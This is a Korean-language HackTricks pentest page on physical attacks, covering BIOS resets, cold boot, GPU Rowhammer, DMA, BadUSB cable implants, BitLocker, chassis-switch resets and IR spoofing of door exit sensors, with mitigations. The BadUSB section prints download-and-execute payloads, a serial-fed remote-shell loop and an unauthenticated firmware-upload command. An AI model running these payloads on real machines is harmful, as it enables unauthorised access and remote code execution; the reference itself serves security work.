# Physical 공격

{{#include ../banners/hacktricks-training.md}}

## BIOS Password 복구 및 시스템 보안

Legacy PC firmware 설정은 CMOS 배터리를 분리하거나 문서화된 clear-CMOS jumper를 사용하여 초기화할 수 있습니다. 필요한 전원 차단 시간은 board마다 다르며, 최신 UEFI password 또는 key는 nonvolatile flash, embedded controller 또는 security device에 저장될 수 있으므로 배터리를 제거해도 유지될 수 있습니다. 핀을 short하기 전에 board/service manual을 확인하십시오. 이 절차로 TPM 측정값이 무효화되고 disk-encryption recovery가 트리거될 수도 있습니다.

Legacy x86 시스템에서는 **killCMOS** 및 **CmosPwd**와 같은 도구를 사용하여 bootable environment에서 CMOS 기반 설정을 검사하거나 변경할 수 있습니다. CmosPwd는 문서화된 일부 구형 BIOS 제품군의 password 형식을 인식하며, CMOS state를 백업, 복원 또는 삭제/kill할 수 있습니다. 공개된 build는 legacy DOS/Windows, Linux, FreeBSD 및 NetBSD environment를 대상으로 합니다.<sup>[[18]](#references)</sup> 이러한 utility는 일반적인 UEFI password remover가 아니며 충분한 hardware/firmware access가 필요합니다.

일부 laptop firmware는 password를 여러 번 잘못 입력한 후 vendor별 challenge code를 표시합니다. [bios-pw.org](https://bios-pw.org)와 같은 database는 일부 model에 대해 legacy vendor recovery password를 생성할 수 있지만, 많은 시스템은 도출 가능한 challenge 없이 lockout을 구현합니다. 생성된 password는 model-specific으로 취급하고, 영구적인 attempt counter를 소진하지 않도록 하십시오.

### UEFI 보안

최신 **UEFI** 시스템에서는 CHIPSEC을 사용하여 Secure Boot variable protection을 audit할 수 있습니다. 아래의 비수정 check부터 시작하십시오. 선택적인 `-a modify` mode는 variable을 의도적으로 corrupt하므로 복구 가능한 lab system에서만 사용해야 합니다. CHIPSEC 자체도 privileged driver와 low-level hardware access가 production endpoint에 적합하지 않다고 경고합니다.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM 분석 및 Cold Boot 공격

DRAM은 refresh가 중단되었다고 해서 모든 비트가 즉시 손실되지는 않는다. 데이터 decay 속도는 모듈 기술과 온도에 따라 크게 달라지며, 냉각하면 냉각하지 않은 전원 cycle보다 훨씬 오래 유용한 데이터를 보존할 수 있다. Cold-boot 공격은 작은 acquisition environment로 빠르게 재부팅하거나 냉각된 모듈을 옮긴 뒤 raw memory를 캡처하고, 비트 decay가 발생한 상태에서도 암호화 키를 재구성한다. 디스크 복사 utility가 자동으로 physical-memory imager가 되는 것은 아니며, Volatility는 capture를 acquisition하는 것이 아니라 분석한다. 플랫폼에 적합하고 검증된 acquisition tool을 사용하라.<sup>[[12]](#references)</sup>

---

## Page Table을 대상으로 하는 GPU Rowhammer

Modern GPU Rowhammer 공격은 일반 buffer 대신 **GPU virtual-memory metadata**를 대상으로 할 때 훨씬 더 유용해진다. **GDDR6 NVIDIA Ampere GPU**에 대한 최신 연구는 권한이 없는 CUDA code를 실행하는 공격자가 GPU별 hammering pattern을 만들고, **memory massaging**을 사용해 paging structure를 취약한 row에 배치한 다음, **last-level page table** 또는 중간 **page directory**의 bit를 flip할 수 있음을 보여준다. 하나의 translation entry가 손상되면 공격자는 **arbitrary GPU memory read/write**를 bootstrap한 뒤 host compromise로 pivot할 수 있다.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6에서 **hammerable row를 profile**하고, in-DRAM mitigation을 우회하는 refresh-aware / non-uniform hammering pattern을 구축한다.
2. **GPU allocation을 massage**하여 driver가 page-translation structure를 기본 보호 pool에 유지하는 대신 hammerable physical location에 배치하도록 한다. 실제로는 low-memory page-table region을 고갈시키고, 제어된 stride를 사용해 대규모 sparse UVM mapping을 spraying하는 방식이 될 수 있다.
3. **PFN** 또는 aperture 관련 bit와 같은 **translation metadata**를 page-table / page-directory entry 내부에서 flip하여, 공격자가 제어하는 virtual page가 page-table page, 임의의 GPU memory 또는 host-visible system mapping으로 resolve되도록 한다.
4. 위조된 mapping을 재사용해 추가 translation entry를 덮어쓰고, GPU context 전체에서 **arbitrary GPU memory read/write**로 권한을 상승시킨다.

### Host Pivot 및 Mitigations

- **IOMMU가 비활성화**되어 있으면 위조된 system-aperture mapping이 임의의 **host physical memory**를 GPU에 노출할 수 있어, GPU primitive가 완전한 host compromise로 이어진다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**는 last-level page-table entry를 대상으로 하는 반면, **GeForge**는 page-directory level을 손상시키는 편이 더 쉬울 수 있음을 보여준다. 한 번의 bit flip으로 더 큰 translation subtree의 대상을 변경할 수 있기 때문이다. 하나의 paging layer만 security-critical하다고 간주하지 말라.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**는 GDDRHammer/GeForge가 사용하는 직접적인 arbitrary-host-memory 경로를 차단하므로 여전히 중요하지만, **완전한 mitigation은 아니다**. **GPUBreach**는 두 번째 단계의 pivot을 보여준다. 공격자가 GPU-writable, driver-owned CPU buffer를 손상시킨 다음 NVIDIA driver의 memory-safety bug를 유발하여 kernel write primitive와 **root shell**을 얻는 방식이며, IOMMU가 활성화된 경우에도 가능하다.<sup>[[3]](#references)</sup>
- 지원되는 workstation/server GPU에서는 **system-level ECC**가 실용적인 hardening 단계다. ECC가 없는 consumer GPU는 더 취약한 defense surface를 노출한다.<sup>[[4]](#references)</sup>
- 이러한 공격은 순전히 이론적인 것이 아니다. **GeForge**는 RTX 3060에서 **1,171**회의 bit flip을, RTX A6000에서 **202**회의 bit flip을 보고했으며, 이는 실제로 동작하는 host-privilege-escalation chain을 구축하기에 충분했다.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) 공격

**Inception**은 FireWire 및 초기 Thunderbolt configuration과 같은 interface를 통한 **DMA-based memory acquisition and patching**을 시연했으며, 과거의 login-bypass signature도 포함한다. 이는 단순히 “Windows 10에서는 비효과적”인 것이 아니다. exploitability는 interface, target build, IOMMU policy, lock state, 그리고 Windows Kernel DMA Protection이 지원되고 활성화되어 있는지에 따라 달라진다. Windows 10 version 1803 이상은 호환되는 platform에서 Kernel DMA Protection을 도입하여 attack surface를 크게 변경했다.<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access를 위한 Live CD/USB

암호화되지 않았거나 이미 unlock된 Windows volume에서는 offline environment가 **sethc.exe** 또는 **Utilman.exe**와 같은 accessibility binary를 **cmd.exe**로 교체할 수 있다. 그러면 해당 logon-screen shortcut이 실행될 때 SYSTEM command prompt가 제공된다. **chntpw**와 같은 tool은 local SAM account data를 편집할 수 있다. 이러한 방법은 잠긴 BitLocker volume을 우회하지 못하며 DPAPI/EFS로 보호된 credential을 손상시킬 수 있다. forensic copy와 backup을 보존하라.

**Kon-Boot**는 지원되는 Windows/macOS configuration을 대상으로 하는 commercial boot-time authentication-bypass tool이다. 호환성은 OS, firmware mode, Secure Boot 및 disk-encryption setup에 따라 달라지며, BitLocker로 잠긴 volume을 decrypt하지는 않는다.<sup>[[10]](#references)</sup>

---

## Windows Security Feature 처리

### Boot 및 Recovery Shortcut

- **Delete/Supr**, F2, F10 또는 다른 vendor key를 누르면 firmware setup이 열릴 수 있다.
- **F8**은 해당 경로가 활성화된 configuration에서만 legacy Windows advanced boot option으로 진입한다. 현재 recovery 진입 방식은 configuration에 따라 다르다.
- **Shift**를 누르고 있으면 일부 configuration에서 Windows automatic logon을 억제할 수 있지만, policy/registry setting으로 이 동작을 비활성화할 수 있다.<sup>[[17]](#references)</sup>

### BAD USB Device

**USB Rubber Ducky** 및 Teensy board와 같은 device는 trusted HID keyboard로 enumerate되어 사전 정의된 keystroke를 inject할 수 있다. Payload는 처음에 logged-on session의 privilege와 desktop access를 가진다. UAC prompt, screen lock, keyboard layout, timing 및 endpoint USB policy는 여전히 payload를 제한한다.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator 또는 backup privilege가 있으면 shadow copy를 생성하거나 registry hive를 저장하여 **SAM** 및 **SYSTEM**과 같은 locked file을 acquisition할 수 있다. 이는 post-compromise collection technique이지 privilege bypass가 아니며, `diskshadow`/VSS 및 registry-hive export event와 상관 분석해야 한다.

## BadUSB / HID Implant Technique

### Wi-Fi managed cable implant

- **Evil Crow Cable Wind**와 같은 ESP32-S3 기반 implant는 USB-A→USB-C 또는 USB-C↔USB-C cable 내부에 숨으며, 순수하게 USB keyboard로 enumerate되고 Wi-Fi를 통해 C2 stack을 노출한다. Operator는 victim host에서 cable에 전원만 공급하고, password가 `123456789`인 `Evil Crow Cable Wind`라는 hotspot을 만든 다음 [http://cable-wind.local/](http://cable-wind.local/) (또는 DHCP address)로 이동해 내장 HTTP interface에 접속하면 된다.<sup>[[8]](#references)</sup>
- Browser UI는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* 및 *Config* tab을 제공한다. 저장된 payload에는 OS별 tag가 지정되고, keyboard layout은 실행 중에 전환되며, VID/PID string은 알려진 peripheral을 흉내 내도록 변경할 수 있다.
- C2가 cable 내부에 존재하므로 phone으로 payload를 준비하고, 실행을 trigger하고, Wi-Fi credential을 관리할 수 있으며 조직의 network를 사용할 필요가 없다. 이는 짧은 dwell-time의 physical intrusion에 유용하다.

### OS-aware AutoExec payload

- AutoExec rule은 하나 이상의 payload를 USB enumeration 직후 실행하도록 연결한다. Implant는 간단한 OS fingerprinting을 수행하고 일치하는 script를 선택한다.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 실행이 unattended로 이루어지므로 charging cable을 교체하는 것만으로도 logged-on user context에서 “plug-and-pwn” initial access를 확보할 수 있다.

### Wi-Fi TCP를 통한 HID-bootstrapped remote shell

1. **Keystroke bootstrap:** 저장된 payload가 console을 열고, 새 USB serial device로 들어오는 내용을 무엇이든 실행하는 loop를 붙여 넣는다. 최소한의 Windows variant는 다음과 같다:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant는 USB CDC channel을 열린 상태로 유지하면서 ESP32-S3가 operator에게 역방향으로 TCP client (Python script, Android APK 또는 desktop executable)를 실행하도록 합니다. TCP session에 입력된 모든 바이트는 위의 serial loop로 전달되므로, air-gapped host에서도 remote command execution이 가능합니다. 출력은 제한적이므로 operator는 일반적으로 blind command (account creation, 추가 tooling staging 등)를 실행합니다.

### HTTP OTA 업데이트 공격 표면

- 문서화된 Evil Crow Cable Wind interface는 `/update`에 unauthenticated firmware-update endpoint를 노출합니다:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- 현장 operators는 케이블을 열지 않고도 engagement 중에 기능을 hot-swap할 수 있습니다(예: flash USB Army Knife firmware). 따라서 implant가 대상 host에 계속 연결된 상태에서 새로운 capabilities로 전환할 수 있습니다.

## BitLocker Encryption 우회

실행 중이거나 최근에 실행된 시스템에서 수행한 승인된 forensic acquisition에는 volume이 unlocked 상태일 때 BitLocker volume master key 또는 관련 key material이 포함될 수 있습니다. Elcomsoft Forensic Disk Decryptor 및 Passware Kit Forensic과 같은 Commercial tools는 지원되는 memory images, hibernation files 또는 crash dumps를 검색할 수 있지만, 성공이 보장되지는 않습니다. 최신 Windows는 BitLocker가 활성화된 경우 crash dumps도 암호화하며, 저장된 48자리 recovery password는 메모리에 존재하는 volume key와는 다른 artifact입니다.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key 추가를 위한 Social Engineering

공격자가 administrator를 설득하여 BitLocker-management commands를 실행하게 만들면 recovery-password, external-key 또는 기타 protector를 추가한 뒤 이를 capture할 수 있습니다. recovery password는 임의의 0 문자열일 수 없습니다. BitLocker numerical recovery passwords는 검증된 48자리 형식이어야 합니다. 관련된 authorized-administration syntax는 `manage-bde -protectors -add C: -recoverypassword`이며, 생성된 protectors는 `manage-bde -protectors -get C:`로 나열할 수 있습니다. Protector 추가를 monitor하고 새로운 recovery material은 승인된 위치에만 escrow되도록 해야 합니다.<sup>[[16]](#references)</sup>

---

## Chassis Intrusion / Maintenance Switch를 악용하여 BIOS를 Factory Reset하기

많은 최신 laptops와 small-form-factor desktops에는 Embedded Controller (EC)와 BIOS/UEFI firmware가 monitor하는 **chassis-intrusion switch**가 포함되어 있습니다. 이 switch의 주된 목적은 device가 열릴 때 alert를 발생시키는 것이지만, 일부 vendors는 switch를 특정 pattern으로 토글할 때 trigger되는 **undocumented recovery shortcut**을 구현하기도 합니다.<sup>[[5]](#references)[[6]](#references)</sup>

### Attack 동작 방식

1. Switch는 EC의 **GPIO interrupt**에 연결되어 있습니다.
2. EC에서 실행되는 firmware는 **press의 timing과 횟수**를 추적합니다.
3. hard-coded pattern이 인식되면 EC는 **system NVRAM/CMOS의 contents를 삭제**하는 *mainboard-reset* routine을 호출합니다.
4. 다음 boot 시 영향을 받은 models는 reset된 firmware state를 로드합니다. Vendor와 revision에 따라 삭제되는 state에는 supervisor password, custom boot settings 또는 enrolled Secure Boot keys가 포함될 수 있습니다. TPM state와 disk-encryption effects는 별도로 평가해야 합니다.

> Firmware reset은 external-boot options를 복원할 수 있지만 storage를 **decrypt하지는 않습니다**. BitLocker 또는 다른 full-disk encryption system은 TPM/firmware 변경 후 recovery 상태로 전환될 수 있으며, recovery key가 없으면 internal drive를 계속 보호합니다.<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen)의 recovery shortcut은 다음과 같습니다:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
10번째 cycle이 끝나면 EC는 다음 reboot 시 BIOS가 NVRAM을 wipe하도록 지시하는 flag를 설정합니다. 전체 절차는 약 40초가 걸리며 **screwdriver만 있으면 됩니다**.<sup>[[5]](#references)</sup>

### 일반적인 Exploitation Procedure

1. EC가 실행 중이 되도록 target의 전원을 켜거나 suspend-resume을 수행합니다.
2. bottom cover를 제거하여 intrusion/maintenance switch를 노출합니다.
3. vendor별 toggle pattern을 재현합니다(documentation, forums를 참고하거나 EC firmware를 reverse-engineer).
4. 재조립하고 reboot한 다음, 실제로 어떤 firmware settings와 credentials가 변경되었는지 검사합니다.
5. 권한이 있고 external boot가 가능한 경우, 통제된 live image로 boot합니다. internal volume이 정상적으로 unlocked되었거나 처음부터 encrypted되지 않았다면, live environment는 credentials와 data를 획득하거나 EFI System Partition을 검사할 수 있습니다. 해당 partition을 수정하여 EFI implant를 설치하는 것은 persistent하고 매우 intrusive하며, Secure Boot, measured boot, firmware write protection 및 endpoint monitoring의 제약을 받습니다. Encrypted storage는 key 또는 recovery material 없이는 접근할 수 없습니다.

### Detection & Mitigation

* OS management console에 chassis-intrusion event를 기록하고 예상치 못한 BIOS reset과 상관 분석합니다.
* 나사/cover에 **tamper-evident seals**를 사용하여 개봉 여부를 감지합니다.
* 장치를 **물리적으로 통제된 구역**에 보관합니다. physical access가 곧 full compromise라고 가정해야 합니다.
* 가능한 경우 vendor의 “maintenance switch reset” feature를 비활성화하거나 NVRAM reset에 추가적인 cryptographic authorisation을 요구합니다.

---

## No-Touch Exit Sensor에 대한 은밀한 IR Injection

### Sensor Characteristics
- 일반적인 “wave-to-exit” sensor는 near-IR LED emitter와 TV remote 스타일의 receiver module을 결합하며, 올바른 carrier의 pulse를 여러 번(약 4~10회) 감지한 뒤에만 logic high를 보고합니다(약 30 kHz).<sup>[[7]](#references)</sup>
- plastic shroud는 emitter와 receiver가 서로를 직접 바라보지 못하게 차단하므로, controller는 검증된 carrier가 가까운 반사에서 발생했다고 가정하고 relay를 구동하여 door strike를 엽니다.
- controller가 target이 있다고 판단하면 outbound modulation envelope를 변경하는 경우가 많지만, receiver는 filtered carrier와 일치하는 모든 burst를 계속 수락합니다.

### Attack Workflow
1. **Emission profile 캡처** – controller pin에 logic analyser를 연결하여 internal IR LED를 구동하는 pre-detection 및 post-detection waveform을 모두 기록합니다.
2. **“Post-detection” waveform만 Replay** – 기본 emitter를 제거하거나 무시하고, 처음부터 이미 triggered된 pattern으로 external IR LED를 구동합니다. receiver는 pulse count/frequency만 확인하므로 spoofed carrier를 실제 reflection으로 처리하고 relay line을 assert합니다.
3. **Transmission Gate** – carrier를 조정된 burst(예: 수십 밀리초 동안 on, 비슷한 시간 동안 off)로 전송하여 receiver의 AGC 또는 interference handling logic을 saturate하지 않고 최소 pulse count를 전달합니다. Continuous emission은 sensor의 감도를 빠르게 낮추어 relay가 작동하지 않게 합니다.

### Long-Range Reflective Injection
- bench LED를 high-power IR diode, MOSFET driver 및 focusing optics로 교체하면 약 6 m 거리에서 안정적으로 triggering할 수 있습니다.
- attacker는 receiver aperture를 직접 조준할 필요가 없습니다. glass를 통해 보이는 interior wall, shelving 또는 door frame에 beam을 조준하면 반사된 energy가 약 30° field of view로 들어가 근거리 hand wave를 모방합니다.
- receiver는 약한 reflection만을 예상하므로, 훨씬 강한 external beam도 여러 surface에 bounce된 뒤 detection threshold 이상으로 유지될 수 있습니다.

### Weaponised Attack Torch
- driver를 commercial flashlight 내부에 내장하면 도구를 평범한 물건처럼 숨길 수 있습니다. visible LED를 receiver의 band에 맞는 high-power IR LED로 교체하고, ATtiny412(또는 유사한 MCU)를 추가하여 약 30 kHz burst를 생성하며, MOSFET을 사용하여 LED current를 sink합니다.
- telescopic zoom lens는 range/precision을 위해 beam을 좁히고, MCU control 하의 vibration motor는 visible light를 방출하지 않고 modulation이 활성화되었음을 haptic confirmation으로 알려줍니다.
- 여러 저장된 modulation pattern(약간씩 다른 carrier frequency와 envelope)을 순환하면 rebranded sensor family 전반의 compatibility가 향상됩니다. 이를 통해 operator는 relay가 audible click을 내며 door가 release될 때까지 reflective surface를 차례로 sweep할 수 있습니다.

---

## References

- [1] [GDDRHammer: DRAM row를 크게 교란하기 — Modern GPU에서의 Cross-Component Rowhammer Attacks](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR Memory를 Hammering하여 재미와 이익을 위해 GPU Page Tables 위조하기](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer를 사용한 GPU Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - 2025년 7월](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. 여기를 눌러 pwn하기”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – 은밀한 IR Torch로 IR No-Touch Exit Sensor 우회하기”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind를 사용한 Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chip에 대한 Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot 공식 documentation 및 compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Key에 대한 Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA를 통한 physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift를 누른 상태에서의 automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation 및 downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
